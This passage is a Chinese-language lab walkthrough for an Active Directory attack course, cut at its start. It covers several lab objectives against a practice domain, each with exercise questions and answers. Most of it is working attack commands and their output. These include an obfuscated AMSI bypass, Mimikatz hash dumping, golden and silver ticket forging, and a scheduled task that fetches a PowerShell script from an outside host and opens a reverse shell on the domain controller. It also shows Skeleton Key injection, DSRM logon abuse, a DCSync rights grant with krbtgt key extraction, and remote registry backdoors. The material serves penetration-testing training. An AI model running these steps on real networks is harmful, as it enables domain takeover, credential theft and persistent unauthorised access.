dcorp-std360
dcorp-std362
dcorp-std364
dcorp-std370
dcorp-std369
dcorp-std368
dcorp-std365
dcorp-std367
dcorp-std361
dcorp-ci
dcorp-std366
dcorp-mssql
dcorp-sql1
dcorp-appsrv
```

可以以本地管理员身份登录到dcorp-dc
```
PS C:\ad> Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local
[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\svcadmin\Documents> hostname
dcorp-dc
```
回到学生有AD权限的学生机器shell里，用下面命令导出dcorp-dc里的所有哈希
```Invoke-Mimikatz -Command '"lsadump::lsa /patch"' –Computername dcorp-dc ```

操作步骤如下：
```
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd c:/ad
PS C:\ad> powershell -ep bypass
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\ad> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BL
E (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'a
ge'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'ai
le') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
PS C:\ad> . .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::lsa /patch
Domain : dcorp / S-1-5-21-1874506631-3219952063-538504511

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : af0686cc0ca8f04df42210c9ac980760

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : ff46a9d8bd66c6efd77603da26796f35

RID  : 000001f7 (503)
User : DefaultAccount
LM   :
NTLM :

RID  : 00000455 (1109)
User : ciadmin
LM   :
NTLM : e08253add90dccf1a208523d02998c3d

RID  : 00000458 (1112)
User : sqladmin
LM   :
NTLM : 07e8be316e3da9a042a9cb681df19bf5

RID  : 00000459 (1113)
User : websvc
LM   :
NTLM : cc098f204c5887eaa8253e7c2749156f

RID  : 0000045b (1115)
User : srvadmin
LM   :
NTLM : a98e18228819e8eec3dfa33cb68b0728

RID  : 0000045d (1117)
User : appadmin
LM   :
NTLM : d549831a955fee51a43c83efb3928fa7

RID  : 00000461 (1121)
User : mgmtadmin
LM   :
NTLM : 95e2cd7ff77379e34c6e46265e75d754

RID  : 00000462 (1122)
User : svcadmin
LM   :
NTLM : b38ff50264b74508085d82c69794a4d8

RID  : 0000046b (1131)
User : studentadmin
LM   :
NTLM : d1254f303421d3cdbdc4c73a5bce0201

RID  : 00000470 (1136)
User : sql1admin
LM   :
NTLM : e999ae4bd06932620a1e78d2112138c6

RID  : 000003e8 (1000)
User : DCORP-DC$
LM   :
NTLM : 126289c16302fb23b71ec09f0d3d5391
```


问题：NTLM hash of krbtgt
答案：ff46a9d8bd66c6efd77603da26796f35

问题：NTLM hash of domain administrator - Administrator
答案: af0686cc0ca8f04df42210c9ac980760

## 制作金票


使用krbtgt和它的NTML哈希制作金票
```
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-
21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600
 /renewmax:10080 /ptt"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
User      : Administrator
Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
SID       : S-1-5-21-1874506631-3219952063-538504511
User Id   : 500
Groups Id : *512
ServiceKey: ff46a9d8bd66c6efd77603da26796f35 - rc4_hmac_nt
Lifetime  : 2/13/2022 10:02:06 PM ; 2/14/2022 8:02:06 AM ; 2/20/2022 10:02:06 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ dollarcorp.moneycorp.local' successfully submitted for current session
```

可以查看是否能进入dcorp-dc的c盘来检查当前session是否有目标机器的Administrator权限
```
PS C:\ad> whoami
dcorp\student366
PS C:\ad> ls \\dcorp-dc.dollarcorp.moneycorp.local\c$


    Directory: \\dcorp-dc.dollarcorp.moneycorp.local\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/29/2019   1:32 AM                PerfLogs
d-r---        2/16/2019   9:14 PM                Program Files
d-----        7/16/2016   6:23 AM                Program Files (x86)
d-r---       12/14/2019   8:23 PM                Users
d-----        8/20/2020   2:05 AM                Windows
```

可以用当前DC上的Administrator的shell，把学生机器添加进DA

```net group "Domain Admins" student366 /ADD /DOMAIN```


# Learning Objective 9:

> Task
> ● Try to get command execution on the domain controller by creating silver ticket for:
> − HOST service
> − WMI


金票和银票的分别
> 1.金票伪造的TGT(Ticket GrantingTicket)，所以可以获取任何Kerberos服务权限
> 2.银票是伪造的TGS的TS，只能访问指定的服务权限
> 3.GoldenTicket是由krbtgt的hash加密
> 4.Silver Ticket是由服务账户（通常为计算机账户）hash加密
> 5.GoldenTicket在使用的过程需要同域控通信
> 6.Silver Ticket在使用的过程不需要同域控通信


上面我们已经知道了DCORP-DC$的哈希，
```
RID  : 000003e8 (1000)
User : DCORP-DC$
LM   :
NTLM : 126289c16302fb23b71ec09f0d3d5391
```
可以用来制作银票

```
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt
User      : Administrator
Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
SID       : S-1-5-21-1874506631-3219952063-538504511
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 126289c16302fb23b71ec09f0d3d5391 - rc4_hmac_nt
Service   : HOST
Target    : dcorp-dc.dollarcorp.moneycorp.local
Lifetime  : 2/13/2022 10:31:17 PM ; 2/11/2032 10:31:17 PM ; 2/11/2032 10:31:17 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ dollarcorp.moneycorp.local' successfully submitted for current session
```

现在当前shell下我们已经有了一个DC上Administrator的session

新建一个定时任务，反弹dc上的一个shell回来。需要注意Invoke-PowerShellTcp.ps1里最后一行要加上
```
Power -Reverse -IPAddress 172.16.100.66 -Port 443
```
表示调用自己

```
PS C:\ad> schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User366" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"

SUCCESS: The scheduled task "User366" has successfully been created.
```

触发定时任务
```
PS C:\ad> schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User366"
SUCCESS: Attempted to run the scheduled task "User366".
```

收到反弹回来的DC上的shell
```
PS C:\ad> .\nc.exe -lnvp 443
listening on [any] 443 ...
connect to [172.16.100.66] from (UNKNOWN) [172.16.2.1] 49762
Windows PowerShell running as user DCORP-DC$ on DCORP-DC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>hostname
dcorp-dc
PS C:\Windows\system32> whoami
nt authority\system
```

问题：The service whose Silver Ticket can be used for scheduling tasks
答案：HOST

# Learning Objective 10:

> Task
> ● Use Domain Admin privileges obtained earlier to execute the Skeleton Key attack.

## 制作万能钥匙

### 方法1
在一台有DA权限的shell里运行下面命令
```
PS C:\ad> . .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.loc
al

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # privilege::debug
Privilege '20' OK

mimikatz(powershell) # misc::skeleton
[KDC] data
[KDC] struct
[KDC] keys patch OK
[RC4] functions
[RC4] init patch OK
[RC4] decrypt patch OK
```

现在所有计算机都可以使用密码：```mimikatz```访问

开一个学生shell使用下面命令以Administrator的身份登录DC
```Enter-PSSession –Computername dcorp-dc –credential dcorp\Administrator```



### 方法2(推荐)

进入DC
```
Enter-PSSession –Computername dcorp-dc –credential dcorp\Spiderman
```

在DC中关闭AMSI
```
[dcorp-dc]: PS C:\Users\Administrator\Documents> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','r
E' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(
'.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') )
,( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

回到学生机器,创建一个DC的登录session
```
$sess = New-PSSession dcorp-dc.dollarcorp.moneycorp.local
```

把mimikatz加载到指定session
```
 Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
```

再次进入DC
```
 Enter-PSSession -Session $sess
```

执行mimikatz，制作万能钥匙
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
```

开一个学生shell使用下面命令以student370的身份进入主机
```Enter-PSSession –Computername dcorp-std370 –credential dcorp\student370```

问题：In which process is the skeleton key injected?
答案：LSASS

# Learning Objective 11:

> Task
> ● Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.


## DSRM利用

目录服务还原模式。除了krbtgt服务帐号外，域控上还有个可利用的账户：目录服务还原模式（DSRM）账户，这个密码是在DC安装的时候设置的，所以一般不会被修改

用有DA权限的shell，运行下面命令，dump出DSRM的哈希密码
```
PS C:\ad> Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

544     {0;000003e7} 1 D 17963          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;00783275} 0 D 7877279     dcorp\svcadmin  S-1-5-21-1874506631-3219952063-538504511-1122   (12g,26p)       Primary
 * Thread Token  : {0;000003e7} 1 D 7921384     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(powershell) # lsadump::sam
Domain : DCORP-DC
SysKey : 85462b93fc25ee67bb07ad899096199b
Local SID : S-1-5-21-1752050383-1088309824-3131404450

SAMKey : 33e0913ef3886d77d5873060bcea1cfb

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: a102ad5753f4c441e3af31c97fad86fd

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount
```

可以看到这里的Administrator的哈希(也就是DSRM的密码)是：```a102ad5753f4c441e3af31c97fad86fd```

再用下面命令dump出现在Administrator的密码，与上面DSRM的密码进行比较
```
PS C:\ad> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::lsa /patch
Domain : dcorp / S-1-5-21-1874506631-3219952063-538504511

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : af0686cc0ca8f04df42210c9ac980760

(略)
```
新的密码是：```af0686cc0ca8f04df42210c9ac980760```

DSRM administrator不允许登陆，用之前的session进入DC修改
```
PS C:\ad> Enter-PSSession $sess
[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\svcadmin\Documents> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + (
'uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6
}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) ).
"g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+
'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

运行下面命令，修改DSRM的远程登录策略
```
[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\svcadmin\Documents> New-ItemProperty "HKLM:\System\CurrentControlSet\
Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD


DsrmAdminLogonBehavior : 2
PSPath                 : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\
PSParentPath           : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control
PSChildName            : Lsa
PSDrive                : HKLM
PSProvider             : Microsoft.PowerShell.Core\Registry
```

现在用DSRM的原始哈希，来运行一个有DA权限的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
```


问题： Name of the Registry key modified to change Logon behavior of DSRM administrator
答案： DsrmAdminLogonBehavior

# Learning Objective 12:

> Task
> ● Check if studentx has Replication (DCSync) rights.
> ● If yes, execute the DCSync attack to pull hashes of the krbtgt user.
> ● If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user.

## Dcsync 攻击

新开一个学生shell（没有DA权限），查找当前账号是否有DCSync的权限
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "student366") -and (($_.ObjectType -m
atch'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```

没有任何返回

执行DCsync，获取krbtgt的账号信息，返回报错
```
PS C:\ad> . .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::dcsync /user:dcorp\krbtgt
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account
ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x000020f7 (8439)
```

证明当前账号是没有DCsync权限的。

来到有DA权限的shell

添加完全控制权限
```
Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student366 -Rights All -Verbose
```
再把Dcsync权限赋予当前学生账号student366
```
Add-ObjectAcl -TargetDistinguishedName"dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName student366 -Rights DCSync -Verbose
```

现在回到学生机shell，再次查看本账号是否有Dcsync权限
```
PS C:\ad> Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "student366") -and (($_.ObjectType -match'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}


InheritedObjectType   : All
ObjectDN              : DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : dcorp\student366
IsInherited           : False
ActiveDirectoryRights : GenericAll
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511
```

现在看到已经显示有GenericAll权限

执行Dcsync,导出krbtgt哈希（也可以是其他用户）
```
PS C:\ad> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::dcsync /user:dcorp\krbtgt
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 2/16/2019 11:01:46 PM
Object Security ID   : S-1-5-21-1874506631-3219952063-538504511-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: ff46a9d8bd66c6efd77603da26796f35
    ntlm- 0: ff46a9d8bd66c6efd77603da26796f35
    lm  - 0: b14d886cf45e2efb5170d4d9c4085aa2

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6cb7f438bf5c099fe4d029ebb5c6e08e

* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : e28b3a5c60e087c8489a410a1199235efaf3b9f125972c7a1e7618a7469bfd6a
      aes128_hmac       (4096) : 4cffc651ba557c963b71b49d1add2e6b
      des_cbc_md5       (4096) : bf5d7319947f54c7

* Primary:Kerberos *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Credentials
      des_cbc_md5       : bf5d7319947f54c7

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  7b766fa41d1e30157b6c0113528e63ea
    02  1bda631fac0fdec6cedfecbc7a99e30d
    03  d7be969eaa4b841a9914e2a5eff571f7
    04  7b766fa41d1e30157b6c0113528e63ea
    05  1bda631fac0fdec6cedfecbc7a99e30d
    06  8835f5f828c434a2fe077eb224e25943
    07  7b766fa41d1e30157b6c0113528e63ea
    08  8fdecaac2296648db5620a13723f60b5
    09  8fdecaac2296648db5620a13723f60b5
    10  aace962cfe8ebce04c9ed249e98369d3
    11  6424d51e82fdc5e6a2f0559032cbead2
    12  8fdecaac2296648db5620a13723f60b5
    13  76e039370f352eaaff05fd2f6f8239d6
    14  6424d51e82fdc5e6a2f0559032cbead2
    15  acc424fd2c2c10d7e46950ad93e065c6
    16  acc424fd2c2c10d7e46950ad93e065c6
    17  734df139b9ceac875a011e24df53d335
    18  e399f39adefad64659a67171b4399221
    19  80cfc6a03006436b02bf3d27e8374444
    20  04a4819688c0185368738acd7a8e12c4
    21  4c60210b91d6e0fddc8a54f16337b218
    22  4c60210b91d6e0fddc8a54f16337b218
    23  ca7e51aef08dffca06881110ea03bf1d
    24  36b3cac402a4005af573f1105ed14b3a
    25  36b3cac402a4005af573f1105ed14b3a
    26  b35c755b303bec7b4b7091a2f96d789f
    27  58300e76fcc0c2c854c8cda6363470e2
    28  2f6cbfe287e89f7f4829f443854857fd
    29  610788375bd98bebd50561d66fcf8f74
```

问题：Attack that can be executed with Replication rights (no DA privileges required)
答案：dcsync

# Learning Objective 13:

> Task
> ● Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access.
> ● Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.

## 安全描述符


在DA权限shell引入RACE.ps1框架
```
PS C:\ad> . .\RACE.ps1
```

为WMI修改安全描述符，允许student366进入WMI
```
Set-RemoteWMI -SamAccountName student366 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose
```

查看
```
gwmi -class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

### 没有登录凭证，修改安全描述符，使得学生机可以在DC上执行命令

设置远程权限，报错
```
PS C:\ad> Set-RemotePSRemoting -SamAccountName student366 -ComputerName dcorp-dc -Verbose
Processing data for a remote command failed with the following error message: The I/O operation has been aborted
because of either a thread exit or an application request. For more information, see the about_Remote_Troubleshooting
Help topic.
    + CategoryInfo          : OperationStopped: (dcorp-dc:String) [], PSRemotingTransportException
    + FullyQualifiedErrorId : JobFailure
    + PSComputerName        : dcorp-dc
```

引入RACE.ps1，域名写全
```
PS C:\ad> . .\RACE.ps1
PS C:\ad> Set-RemotePSRemoting -SamAccountName student366 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```


执行whoami命令
```
Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```


### 无管理员密码的情况下从目标机器上dump出哈希

在DC上修改权限，允许本账号（student366）远程dump出哈希，在DAshell
```
Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student366 -Verbose
```

在学生shell
引入框架
```
PS C:\ad> . .\RACE.ps1
```

dump出dcorp-dc这台机器的哈希
```
PS C:\ad> Get-RemoteMachineAccountHash -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
VERBOSE: Bootkey/SysKey : 85462B93FC25EE67BB07AD899096199B
VERBOSE: LSA Key        : FD3251451B1293B9ED7AF4BED8E19A678F514B9BC2B42B796E2C72AF156945E9

ComputerName                        MachineAccountHash
------------                        ------------------
dcorp-dc.dollarcorp.moneycorp.local 126289c16302fb23b71ec09f0d3d5391
```

现在我们有了这台机器的哈希，可以用来制作银票

基于HOST服务的银票
```
PS C:\ad> . .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-321995
2063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Adm
inistrator /ptt"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511
 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /pt
t
User      : Administrator
Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
SID       : S-1-5-21-1874506631-3219952063-538504511
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 126289c16302fb23b71ec09f0d3d5391 - rc4_hmac_nt
Service   : HOST
Target    : dcorp-dc.dollarcorp.moneycorp.local
Lifetime  : 2/14/2022 2:09:44 AM ; 2/12/2032 2:09:44 AM ; 2/12/2032 2:09:44 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ dollarcorp.moneycorp.local' successfully submitted for current session
```

基于RPCSS服务的银票
```
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-321995
2063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Ad
ministrator /ptt"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511
 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /p
tt
User      : Administrator
Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
SID       : S-1-5-21-1874506631-3219952063-538504511
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 126289c16302fb23b71ec09f0d3d5391 - rc4_hmac_nt
Service   : RPCSS
Target    : dcorp-dc.dollarcorp.moneycorp.local
Lifetime  : 2/14/2022 2:12:08 AM ; 2/12/2032 2:12:08 AM ; 2/12/2032 2:12:08 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ dollarcorp.moneycorp.local' successfully submitted for current session
```

gwmi -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local


问题：SDDL string that provides studentx same permissions as BA on root\cimv2 WMI namespace. Flag value is the permissions string from (A;CI;Permissions String;;;SID)

答案：CCDCLCSWRPWPRCWD